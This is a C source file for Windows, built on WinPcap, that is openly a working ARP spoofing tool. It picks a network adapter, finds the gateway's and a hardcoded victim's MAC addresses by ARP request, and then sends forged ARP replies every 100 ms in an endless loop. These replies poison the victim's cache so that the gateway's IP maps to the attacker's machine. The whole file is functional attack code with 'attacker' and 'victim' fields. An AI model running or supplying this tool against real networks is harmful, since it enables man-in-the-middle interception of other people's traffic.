#include <WinSock2.h>
#include <iphlpapi.h>
#include <pcap.h>
#include <stdio.h>
#include <stdint.h>

#pragma warning(disable:4996)

#define ETH_LEN	6
#define IP_LEN	4

#define ETHERTYPE_ARP 0x0806

#define HWTPYE_ETH 0x0001
#define PROTOCOLTYPE_IP 0x0800
#define HWSIZE 0x06
#define PROTOCOLSIZE 0x04
#define OPCODE_REQUEST 0x0001
#define OPCODE_REPLY 0x0002


bool get_adapters();
bool print_adapters(PIP_ADAPTER_ADDRESSES tmp);
bool insert_adapters_iist(PIP_ADAPTER_ADDRESSES tmp);
bool open_adapter(int _inum);
bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[]);
void print_info(uint8_t _addr[], int _len);
bool arpspoofing();

typedef struct _adapter_list
{
	int			number;
	PCHAR		interfaceName;
	PWCHAR		FriendlyName;
	PWCHAR		adapterName;
	u_int8_t	mac_addr[ETH_LEN];
	ULONG		ip_addr;
	ULONG		gate_addr;
	struct _adapter_list* next;
} Adapter_list, *pAdapter_list;

typedef struct _pcap_info
{
	uint8_t		attacker_ip[IP_LEN];
	uint8_t		attacker_mac[ETH_LEN];
	uint8_t		victim_ip[IP_LEN];
	uint8_t		victim_mac[ETH_LEN];
	uint8_t		gateway_ip[IP_LEN];
	uint8_t		gateway_mac[ETH_LEN];
	pcap_t*		pcap_handle;
} pcap_info;

// ETH ARP header 

#pragma pack(push, 1)
struct ether_header
{
	uint8_t dst_host[ETH_LEN];
	uint8_t src_host[ETH_LEN];
	uint16_t ether_type;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct arp_header
{
	uint16_t hw_type;
	uint16_t protocol_type;
	uint8_t hw_size;
	uint8_t protocol_size;
	uint16_t opcode;
	uint8_t sebder_host[ETH_LEN];
	uint8_t sender_ip[IP_LEN];
	uint8_t target_host[ETH_LEN];
	uint8_t target_ip[IP_LEN];
};
#pragma pack(pop)

pAdapter_list head_list = NULL, tail_list = NULL, work_list = NULL;
pcap_info info = { 0 };

int main(int agrc, char* garv[])
{
	// IP 바꾸고
	info.victim_ip[0] = 192;
	info.victim_ip[1] = 168;
	info.victim_ip[2] = 42;
	info.victim_ip[3] = 5;

	if (!get_adapters())
	{
		fprintf(stderr, "\n [!] get_adapters() Error...\n");
		return -1;
	}

	int input_adapter;
	fprintf(stdout, " Enter the interface number : ");
	scanf_s("%d", &input_adapter);

	if (!open_adapter(input_adapter))
	{
		fprintf(stderr, "\n [!] open_adapter() Error...\n");
		return -1;
	}

	fprintf(stdout, " Find Gateway MAC Address... ");
	if (!find_macaddr(info.gateway_ip, info.gateway_mac))
	{
		fprintf(stderr, "\n [!] find_macaddr() Error...\n");
		return -1;
	}
	fprintf(stdout, "OK\n");

	fprintf(stdout, " Find Victim MAC Address... ");
	if (!find_macaddr(info.victim_ip, info.victim_mac))
	{
		fprintf(stderr, "\n [!] find_macaddr() Error...\n");
		return -1;
	}
	fprintf(stdout, "OK\n");

	fprintf(stdout, "\n\n Attacker MAC Address : ");
	print_info(info.attacker_mac, ETH_LEN);
	fprintf(stdout, "\n Attacker IP Address : ");
	print_info(info.attacker_ip, IP_LEN);

	fprintf(stdout, "\n\n Victim MAC Address : ");
	print_info(info.victim_mac, ETH_LEN);
	fprintf(stdout, "\n Victim IP Address : ");
	print_info(info.victim_ip, IP_LEN);

	fprintf(stdout, "\n\n Gateway MAC Address : ");
	print_info(info.gateway_mac, ETH_LEN);
	fprintf(stdout, "\n Gateway IP Address : ");
	print_info(info.gateway_ip, IP_LEN);

	if (!arpspoofing())
	{
		fprintf(stderr, "\n [!] arpspoofing() Error...\n");
		return -1;
	}

	return 0;
}

bool get_adapters()
{
	DWORD dwRet;
	PIP_ADAPTER_ADDRESSES pAdpAddrs;
	PIP_ADAPTER_ADDRESSES tmp;
	unsigned long ulBufLen = sizeof(IP_ADAPTER_ADDRESSES);

	pAdpAddrs = (PIP_ADAPTER_ADDRESSES)malloc(ulBufLen);
	if (!pAdpAddrs) return false;
	dwRet = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAdpAddrs, &ulBufLen);
	if (dwRet == ERROR_BUFFER_OVERFLOW)
	{
		free(pAdpAddrs);
		pAdpAddrs = (PIP_ADAPTER_ADDRESSES)malloc(ulBufLen);

		if (!pAdpAddrs)
			return false;
	}

	dwRet = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAdpAddrs, &ulBufLen);
	if (dwRet != NO_ERROR)
	{
		free(pAdpAddrs);
		return false;
	}

	for (tmp = pAdpAddrs; tmp != NULL; tmp = tmp->Next)
	{
		if (print_adapters(tmp))
		{
			if (!insert_adapters_iist(tmp))
				return false;
		}
	}
	return true;
}

bool print_adapters(PIP_ADAPTER_ADDRESSES tmp)
{
	PIP_ADAPTER_UNICAST_ADDRESS pThisAddrs;
	PIP_ADAPTER_GATEWAY_ADDRESS pGateAddrs;

	static int count = 0;
	char fname_buf[BUFSIZ] = { 0 };
	char dname_buf[BUFSIZ] = { 0 };

	if (tmp->OperStatus == IfOperStatusUp)
	{
		WideCharToMultiByte(CP_ACP, 0, tmp->FriendlyName, wcslen(tmp->FriendlyName), fname_buf, BUFSIZ, NULL, NULL);
		fprintf(stdout, " %d) Adapter OS Name : %s \n", ++count, fname_buf);
		fprintf(stdout, "    Adapter Interface : %s \n", tmp->AdapterName);

		WideCharToMultiByte(CP_ACP, 0, tmp->Description, wcslen(tmp->Description), dname_buf, BUFSIZ, NULL, NULL);
		fprintf(stdout, "    Adapter Name : %s \n", dname_buf);

		for (pThisAddrs = tmp->FirstUnicastAddress; NULL != pThisAddrs; pThisAddrs = pThisAddrs->Next)
		{
			struct sockaddr_in* pAddr = (struct sockaddr_in*)pThisAddrs->Address.lpSockaddr;
			fprintf(stdout, "    Adapter IP : %s\n", inet_ntoa(pAddr->sin_addr));
		}

		fprintf(stdout, "    Adapter MAC : ");
		for (int i = 0; i < ETH_LEN; i++)
		{
			fprintf(stdout, "%.2x", tmp->PhysicalAddress[i]);
			if (i != 5)
				fprintf(stdout, ":");
		}
		fprintf(stdout, "\n    Gateway IP : ");
		for (pGateAddrs = tmp->FirstGatewayAddress; NULL != pGateAddrs; pGateAddrs = pGateAddrs->Next)
		{
			struct sockaddr_in* pAddr = (struct sockaddr_in*)pGateAddrs->Address.lpSockaddr;
			fprintf(stdout, "%s", inet_ntoa(pAddr->sin_addr));

		}
		fprintf(stdout, "\n\n");
		return true;
	}
	return false;
}

bool insert_adapters_iist(PIP_ADAPTER_ADDRESSES tmp)
{
	PIP_ADAPTER_UNICAST_ADDRESS pThisAddrs;
	PIP_ADAPTER_GATEWAY_ADDRESS pGateAddrs;

	static int number = 0;
	work_list = (Adapter_list*)malloc(sizeof(Adapter_list));
	if (work_list == NULL)
	{
		fprintf(stderr, "malloc() error...\n");
		return false;
	}
	work_list->number = ++number;
	work_list->interfaceName = tmp->AdapterName;
	work_list->FriendlyName = tmp->FriendlyName;
	work_list->adapterName = tmp->Description;

	for (int i = 0; i < ETH_LEN; i++)
		work_list->mac_addr[i] = tmp->PhysicalAddress[i];
	for (pThisAddrs = tmp->FirstUnicastAddress; NULL != pThisAddrs; pThisAddrs = pThisAddrs->Next)
	{
		struct sockaddr_in* pAddr = (struct sockaddr_in*)pThisAddrs->Address.lpSockaddr;
		work_list->ip_addr = htonl(inet_addr(inet_ntoa(pAddr->sin_addr)));
	}

	for (pGateAddrs = tmp->FirstGatewayAddress; NULL != pGateAddrs; pGateAddrs = pGateAddrs->Next)
	{
		struct sockaddr_in* pAddr = (struct sockaddr_in*)pGateAddrs->Address.lpSockaddr;
		work_list->gate_addr = htonl(inet_addr(inet_ntoa(pAddr->sin_addr)));
	}

	work_list->next = NULL;

	if (head_list == NULL)
	{
		head_list = work_list;
		tail_list = work_list;
		return true;
	}

	tail_list->next = work_list;
	tail_list = work_list;

	return true;
}

bool open_adapter(int _inum)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	int i;
	char name[1000] = "\\Device\\NPF_";

	work_list = head_list;

	for (i = 1; i <= _inum; i++)
	{
		if (work_list->number == _inum)
			break;
		work_list = work_list->next;
	}

	strcat(name, work_list->interfaceName);

	for (i = 0; i < ETH_LEN; i++)
		info.attacker_mac[i] = work_list->mac_addr[i];

	for (int i = 0; i < IP_LEN; i++)
	{
		info.attacker_ip[i] = ((uint8_t*)&work_list->ip_addr)[3 - i];
		info.gateway_ip[i] = ((uint8_t*)&work_list->gate_addr)[3 - i];
	}

	info.pcap_handle = pcap_open(name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1, NULL, errbuf);
	if (info.pcap_handle == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", name);
		return false;
	}
	return true;
}

bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
{
	uint8_t packet[2500] = { 0 };

	// TODO arp request packet

	int i;
	struct ether_header eh;
	struct arp_header arp;
	uint8_t padding[18];
	
	for (i = 0; i < 18; i++)
	{
		padding[i] = 0;
	}

	for (i = 0; i < ETH_LEN; i++)
	{
		eh.dst_host[i] = 0xff;
	}

	for (i = 0; i < ETH_LEN; i++)
	{
		eh.src_host[i] = info.attacker_mac[i];
	}

	eh.ether_type = htons(ETHERTYPE_ARP);
	
	arp.hw_type = htons(HWTPYE_ETH);
	arp.protocol_type = htons(PROTOCOLTYPE_IP);
	arp.hw_size = HWSIZE;
	arp.protocol_size = PROTOCOLSIZE;
	arp.opcode = htons(OPCODE_REQUEST);
	
	for (i = 0; i < ETH_LEN; i++)
	{
		arp.sebder_host[i] = info.attacker_mac[i];
	}

	for (i = 0; i < IP_LEN; i++)
	{
		arp.sender_ip[i] = info.attacker_ip[i];
	}

	for (i = 0; i < ETH_LEN; i++)
	{
		arp.target_host[i] = _dst_mac[i];
	}

	for (i = 0; i < IP_LEN; i++)
	{
		arp.target_ip[i] = _src_ip[i];
	}


	int length = 0;

	memcpy(packet, &eh, sizeof(eh));
	length += sizeof(eh);
	memcpy(packet + length, &arp, sizeof(arp));
	length += sizeof(arp);
	memcpy(packet + length, &padding, sizeof(padding));
	length += sizeof(padding);

	// 여기부터 next Reply 잡아오기.
	while (1)
	{
		struct pcap_pkthdr* header;
		const u_char* pkt_data;
		int datalen = 0;
		int res;
		
		if (pcap_sendpacket(info.pcap_handle, packet, length) != 0)
		{
			fprintf(stderr, "\n [!] pcap_sendpacket() Error...\n");
			return false;
		}

		res = pcap_next_ex(info.pcap_handle, &header, &pkt_data);
		if (res == 0)
			continue;

		struct ether_header* Peh;
		struct arp_header* Parp;

		Peh = (struct ether_header*)pkt_data;
		datalen += sizeof(*Peh);

		if (ntohs(Peh->ether_type) == ETHERTYPE_ARP)
		{
			Parp = (struct arp_header*)(pkt_data + datalen);
			
			if (ntohs(Parp->opcode) == OPCODE_REPLY 
				&& Parp->sender_ip[0] == _src_ip[0]
				&& Parp->sender_ip[1] == _src_ip[1]
				&& Parp->sender_ip[2] == _src_ip[2]
				&& Parp->sender_ip[3] == _src_ip[3])
			{
				for (i = 0; i < ETH_LEN; i++)
				{
					_dst_mac[i] = Parp->sebder_host[i];
					
				}
				return true;
				
			}
		}
		
	}
	
}

void print_info(uint8_t _addr[], int _len)
{
	int i;
	if (_len == ETH_LEN)
	{
		for (i = 0; i < _len; i++) {
			fprintf(stdout, "%.2x", _addr[i]);
			if (i != (ETH_LEN - 1))
				fprintf(stdout, ":");
		}
	}
	else if (_len == IP_LEN)
	{
		for (i = 0; i < _len; i++) {
			fprintf(stdout, "%u", _addr[i]);
			if (i != (IP_LEN - 1))
				fprintf(stdout, ".");
		}
	}
}

bool arpspoofing()
{
	uint8_t packet[2500] = { 0 };

	// TODO make arp reply packet

	int i;
	struct ether_header eh;
	struct arp_header arp;
	uint8_t padding[18];

	for (i = 0; i < 18; i++)
	{
		padding[i] = 0;
	}

	for (i = 0; i < ETH_LEN; i++)
	{
		eh.dst_host[i] = info.victim_mac[i];
	}

	for (i = 0; i < ETH_LEN; i++)
	{
		eh.src_host[i] = info.attacker_mac[i];
	}

	eh.ether_type = htons(ETHERTYPE_ARP);

	arp.hw_type = htons(HWTPYE_ETH);
	arp.protocol_type = htons(PROTOCOLTYPE_IP);
	arp.hw_size = HWSIZE;
	arp.protocol_size = PROTOCOLSIZE;
	arp.opcode = htons(OPCODE_REPLY);

	for (i = 0; i < ETH_LEN; i++)
	{
		arp.sebder_host[i] = info.attacker_mac[i];
	}

	for (i = 0; i < IP_LEN; i++)
	{
		arp.sender_ip[i] = info.gateway_ip[i];
	}

	for (i = 0; i < ETH_LEN; i++)
	{
		arp.target_host[i] = info.victim_mac[i];
	}

	for (i = 0; i < IP_LEN; i++)
	{
		arp.target_ip[i] = info.victim_ip[i];
	}

	int length = 0;

	memcpy(packet, &eh, sizeof(eh));
	length += sizeof(eh);
	memcpy(packet + length, &arp, sizeof(arp));
	length += sizeof(arp);
	memcpy(packet + length, &padding, sizeof(padding));
	length += sizeof(padding);

	for (;;)
	{
		if (pcap_sendpacket(info.pcap_handle, packet, length) != 0)
		{
			fprintf(stderr, "\n [!] pcap_sendpacket() Error...\n");
			return false;
		}
		Sleep(100);
	}
	return true;
}